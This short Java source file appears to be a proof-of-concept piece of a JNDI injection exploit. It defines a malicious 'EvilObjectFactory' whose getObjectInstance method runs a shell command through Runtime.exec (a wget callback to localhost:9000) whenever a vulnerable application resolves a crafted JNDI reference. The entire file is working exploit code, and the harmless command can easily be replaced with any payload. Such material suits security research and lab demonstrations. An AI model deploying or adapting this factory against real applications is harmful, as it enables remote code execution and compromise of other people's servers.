package com.trganda.factory;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class EvilObjectFactory implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return Runtime.getRuntime().exec("wget localhost:9000");
    }
}
